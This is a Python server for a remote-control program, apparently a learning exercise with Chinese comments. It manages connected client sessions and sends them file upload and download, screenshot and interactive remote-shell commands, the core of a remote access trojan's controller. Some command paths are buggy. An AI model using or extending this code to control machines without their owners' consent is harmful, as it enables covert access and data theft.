import os
import socket
import threading

# 保存所有的客户端套接字
client_list = []
# 当前正在使用的套接字
client_cur = None
# 保存所有可执行命令
orders = {'help': 'get help', 'cd': 'change current floder'}
orderlist = [i for i in orders]


# 命令验证
def check_send(client_sock, cmd):
    # 验证命令完整性
    list_file = ['upload', 'download']
    list_os = ['screenshot']
    list_change = ['id']
    if cmd[0] in list_file:
        if len(cmd) != 3:
            print('命令错误，请输入[help]查看详情')
            return
        # 发送命令
        send_cmd(client_sock, cmd)
    elif cmd[0] in list_os:
        if len(cmd) > 1:
            print('命令错误，请输入[help]查看详情')
            return
        # 发送命令
        send_cmd(client_sock, cmd)
    elif cmd[0] in list_change:
        if len(cmd) != 2:
            print('命令错误，请输入[help]查看详情')
            return
        # 发送命令
        change(cmd)
    else:
        print('命令错误，请输入[help]查看详情')
        return


# 切换客户端
def change(cmd):
    global client_cur
    # 验证绘画ID是否存在
    id = int(cmd[1])
    if id in range(len(client_list)):
        '有效ID,切换会话'
        client_cur = client_list[id][0]
        print(f'已切换到ID{id}')
    else:
        print('切换失败')


# 显示所有客户端
def show_client():
    if len(client_list) > 0:
        for index, client_a in enumerate(client_list):
            print(f'ID{index}:{client_a[1]}')
    else:
        print('当前无连接')
        return


# 文件上传
def upload_file(client_sock, cmd):
    # upload d:\1.txt d:\
    # strip()删除命令字符串两端的空字符
    MAX_SEND_SIZE = 1024
    # cmd = cmd.strip().split()
    # 验证命令完整性
    if len(cmd) != 3:
        print('文件上传命令错误，请输入[help]查看详情')
        return
    # 验证文件是否存在
    if not os.path.exists(cmd[1]):
        print(f'文件{cmd[1]}不存在，请检查文件')
        return
    # 读文件，发送上传文件命令
    # 先获取文件大小，计算发送次数
    file_size = os.path.getsize(cmd[1])
    # 计算数据发送次数
    tmp = file_size % MAX_SEND_SIZE
    if tmp:
        count = file_size // MAX_SEND_SIZE + 1
    else:
        count = file_size // MAX_SEND_SIZE

    # 把命令先发送过去,命令，文件大小，存放路径
    send_cmd(client_sock, cmd, str(file_size), os.path.basename(cmd[2]))

    # 读取文件内容并发送出去
    file = open(cmd[1], 'rb')
    print('.............uploading............')
    for i in range(count):
        data = file.read(MAX_SEND_SIZE)
        send_content(client_sock, data)
        print(f'发送数据：{data}')
    file.close()

    print('upload finished')


# 文件下载
def download_file(client_sock):
    MAX_SEND_SIZE = 1024
    # 接收客户端返回信息
    rec_cmd = client_sock.recv(1024).decode()
    rec_cmd = rec_cmd.strip().split()
    # 验证保存的目录是否存在，如果不存在就获取当前目录并写入,
    file_dir = os.path.dirname(rec_cmd[2])

    if not os.path.exists(file_dir):
        file_dir = os.getcwd()
    # 提取要保存的文件名，此参数也在接收命令倒数第一个参数中
    file_name = os.path.basename(rec_cmd[2])
    tmp = os.path.splitext(file_name)
    tmp2 = os.path.splitext(os.path.basename(rec_cmd[1]))
    if tmp[1] == tmp2[1]:
        pass
    else:
        file_name = 'copy' + os.path.basename(rec_cmd[1])
    # 接受文件大小计算次数
    print(f'接收到的信息:{rec_cmd}')
    file_size = int(rec_cmd[3])
    # 计算数据接受次数
    tmp = file_size % MAX_SEND_SIZE
    if tmp:
        count = file_size // MAX_SEND_SIZE + 1
    else:
        count = file_size // MAX_SEND_SIZE
    # 创建文件，写入内容
    path = os.path.join(file_dir, file_name)
    file = open(path, 'wb')
    for i in range(count):
        data = client_sock.recv(1024)
        # print(f'正在写入:')
        file.write(data)
    file.close()
    print('文件下载成功')


# 进入目标系统执行命令
def os_shell(client_sock, cmd):
    cmd = 'os-shell'
    # 发送命令
    send_cmd(client_sock, cmd)
    # client_sock,send(cmd.encode())
    # 创建一个死循环，在其中输入要执行的系统命令
    while True:
        cmd = input("os-shell>>")
        # 先发送，确保推出的时候，客户端那边也也退出
        send_cmd(client_sock, cmd)
        if cmd == 'exit':
            break


# 帮助提示
def print_help():
    print('help information:')
    for order in orders:
        print(f'{order}   {orders[order]}')


# 等待客户端的连接
def wait_for_client(sock):
    global client_list
    while True:
        if not client_list:
            print('等待连接...')
        client_sock, client_obj = sock.accept()
        # 连接到一个客户端就创建一个与之对应的线程
        t = threading.Thread(target=recv_client_msg,
                             args=(client_sock, client_obj))
        t.start()
        # 连接成功就保存到客户端列表中’
        client_list.append((client_sock, client_obj))
        print(f'客户端{client_obj}上线')


# 接收来自客户端的信息
def recv_client_msg(client_sock, client_obj):
    MAX_RECV_SIZE = 1024
    while True:
        data = None
        # 处理来自客户端的消息
        try:
            # 这里是接收所有客户端消息吗，是的s.recv函数接收所有的客户端传来信息，
            # 必须保证只有一个线程调用此函数否则会发生冲突
            data = client_sock.recv(MAX_RECV_SIZE).decode()
        except ConnectionError:
            '连接错误直接pass'
            pass
        if not data:
            print(f'客户端{client_obj}下线')
            break
        # 处理接收到的消息
        data = data.strip().split()
        if data[0] == 'download':
            '此处客户端端接收到服务端下载命令，调用文件上传函数，' \
            '发送消息提示服务端准备接收文件'
            download_file(client_sock)
        else:
            data = ' '.join(data)
            print(f'收到{client_obj}的消息为：', data)


# 获取命令并发送执行的主函数
def exec_cmd(client_cur, cmd):
    cmd = cmd.strip().split()
    if len(cmd) == 0:
        return
    if cmd[0] == 'help':
        print_help()
    elif cmd[0] == 'upload':
        upload_file(client_cur, cmd)
    elif cmd[0] == 'download':
        check_send(client_cur, cmd)
    elif cmd[0] == 'shell':
        os_shell(client_cur, cmd)
    elif cmd[0] == 'screenshoot':
        check_send(client_cur, cmd)
    elif cmd[0] == 'id':
        check_send(client_cur, cmd)
    elif cmd[0] == 'allid':
        show_client()
    else:
        send_cmd(client_cur, cmd)
        print(f'消息已发送到客户端')
        print(f'如果要执行命令，输入[help]获得提示')


def send_cmd1(client_sock, cmd, file_size, basename):
    cmd.append(file_size)
    cmd.append(basename)
    tmp = ' '.join(cmd)
    client_sock.send(tmp.encode())
    return


# 发送命令给客户端
def send_cmd(client_sock, *cmd):
    cmd = list(cmd)
    if isinstance(cmd[0], list):
        tmp = cmd[0]
        for i in range(1, len(cmd)):
            tmp.append(cmd[i])
        tmp = ' '.join(tmp)
        client_sock.send(tmp.encode())
    else:
        if 1 < len(cmd):
            cmd = ' '.join(cmd)
            client_sock.send(cmd.encode())
        else:
            client_sock.send(cmd[0].encode())


def send_content(client_sock, data):
    client_sock.send(data)
    return


# 1.创建套接字，是一个TCP连接
sock = socket.socket()
# 2.绑定IP和端口
sock.bind(('127.0.0.1', 8888))  # 元组形式传输host+port
# 3.设置监听，最大连接数为5
sock.listen(5)
# 4.等待客户端连接，阻塞模式
t1 = threading.Thread(target=wait_for_client, args=(sock,))
t1.start()
# 主线程只管发送消息
while True:
    'client_list不为空，说明有客户端连接了'
    if len(client_list) > 0:
        '默认使用第一个连接上来的客户端'
        client_cur = client_list[0][0]
        '程序主循环'
        while True:
            '输入命令'
            order = input('RC-shell>>')
            # 'upload d:\\1.txt d:\'
            if order.strip() == 'exit':
                exit(0)
            else:
                # 执行命令和发送消息,因为是两个线程，在此执行命令会与接收消息函数产生冲突
                exec_cmd(client_cur, order)
                # client_cur.send(order.encode())
